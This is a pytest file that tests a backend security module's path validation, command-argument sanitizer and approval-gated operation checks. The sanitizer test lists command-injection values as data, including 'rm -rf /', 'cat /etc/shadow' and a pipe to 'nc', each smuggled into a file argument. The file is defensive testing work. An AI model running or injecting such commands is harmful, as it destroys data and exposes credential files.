import pytest
from pathlib import Path
from backend.app.core.security import (
    SecurityError,
    sanitize_command_args,
    validate_operation_safety,
    validate_project_path,
)


def test_empty_project_path():
    with pytest.raises(SecurityError, match="cannot be empty"):
        validate_project_path("")


def test_forbidden_system_paths():
    with pytest.raises(SecurityError, match="strictly forbidden"):
        validate_project_path("/etc/passwd")

    with pytest.raises(SecurityError, match="strictly forbidden"):
        validate_project_path("/root")


def test_command_arg_sanitization():
    # Safe args
    safe = ["--format", "json", "file.kicad_pcb"]
    assert sanitize_command_args(safe) == safe

    # Injection tokens
    dangerous_cases = [
        ["file.v; rm -rf /"],
        ["file.v && cat /etc/shadow"],
        ["file.v | nc 1.2.3.4"],
        ["`reboot`"],
        ["$USER"],
    ]
    for case in dangerous_cases:
        with pytest.raises(SecurityError, match="forbidden token"):
            sanitize_command_args(case)


def test_operation_safety_checks():
    # Allowed with approval
    validate_operation_safety("kicad_drc", requires_approval=True, approved=True)

    # Disallowed operation
    with pytest.raises(SecurityError, match="is not permitted"):
        validate_operation_safety("unauthorized_op", requires_approval=False, approved=False)

    # Approval missing
    with pytest.raises(SecurityError, match="requires explicit user approval"):
        validate_operation_safety("kicad_drc", requires_approval=True, approved=False)

